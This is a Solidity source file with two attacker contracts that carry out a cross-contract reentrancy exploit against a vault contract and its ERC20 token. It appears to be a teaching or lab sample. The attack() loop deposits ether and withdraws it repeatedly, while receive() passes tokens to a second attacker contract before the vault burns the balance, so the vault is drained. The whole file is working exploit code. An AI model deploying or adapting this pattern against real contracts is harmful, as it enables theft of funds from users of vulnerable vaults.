// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./vault.sol";


contract attack_cross_contract_reentrancy {
    cross_contract_reentrancy victim;
    ERC20 ccrt;
    attack2_cross_contract_reentrancy attacker2;
    uint256 amount = 1 ether;

    /**
     * @param _victim victim address
     * @param _ccrt  victim token ERC20 address
     */ 
    constructor(cross_contract_reentrancy _victim, ERC20 _ccrt) payable {
        victim = cross_contract_reentrancy(_victim);
        ccrt = ERC20(_ccrt);  
    }


    /**
     * @notice Set attacker2 contract
     * @param _attacker2  attacker colleague address
     */
    function setattacker2(address _attacker2) public {
        attacker2 = attack2_cross_contract_reentrancy(_attacker2);
    }

    /**
     * @notice Receive ether. same amout of withdraw() but we can transfer same amount to attacker2. 
     * Because burn balance of attacker1 after this function.
     * @dev triggered by victim.withdraw()
     */
    receive() external payable {
        ccrt.transfer(address(attacker2), msg.value); 
    }

    /**
     * @notice deposit and we can repeatly withdraw.
     */
    function attack() public {
        uint256 value = address(this).balance;
        victim.deposit{value: value}();
        while(address(victim).balance >= amount){
            victim.withdraw();
            attacker2.send(address(this), value); //send ERC20 token that multiplied at recieve().
        }    
    }
}


contract attack2_cross_contract_reentrancy {
    cross_contract_reentrancy victim;
    ERC20 ccrt;
    uint256 amount = 1 ether;

    constructor(cross_contract_reentrancy _victim, ERC20 _ccrt) {
        victim = cross_contract_reentrancy(_victim);
        ccrt = ERC20(_ccrt);
    }

    /**
     * @notice Just send ERC20 to the attacker
     */
    function send(address _target, uint256 _amount) public {
        ccrt.transfer(_target, _amount);
    }
}


